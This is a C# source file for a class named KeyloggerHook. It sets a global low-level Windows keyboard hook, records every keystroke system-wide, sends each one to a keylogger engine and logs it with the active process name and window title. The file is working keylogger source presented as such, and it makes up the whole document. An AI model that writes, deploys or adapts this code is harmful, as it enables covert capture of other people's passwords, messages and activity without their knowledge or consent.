using Common.Helpers;
using Common.Interfaces;
using KeyLogger.Interfaces;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class KeyloggerHook : IKeyLoggerHook
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private IntPtr hookId = IntPtr.Zero;
    private LowLevelKeyboardProc proc;
    private readonly IKeyLoggerEngine engine;
    private readonly ILogger logger;

    public KeyloggerHook(IKeyLoggerEngine engine, ILogger logger = null)
    {
        this.engine = engine;
        this.logger = logger ?? new Logger();
        proc = HookCallback;
    }

    public void Start()
    {
        hookId = SetHook(proc);
        logger.LogInformation("KeyloggerHook started.");
    }

    public void Stop()
    {
        UnhookWindowsHookEx(hookId);
        logger.LogInformation("KeyloggerHook stopped.");
    }

    private IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (var curProcess = Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            engine.EnqueueKeyAsync(lParam);

            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            var helper = new ForegroundWindowHelper();
            string windowTitle = helper.GetActiveWindowTitle();
            string processName = helper.GetProcessName();

            logger.LogInformation($"Key pressed: {key} in {processName} - {windowTitle}");
        }

        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();
}
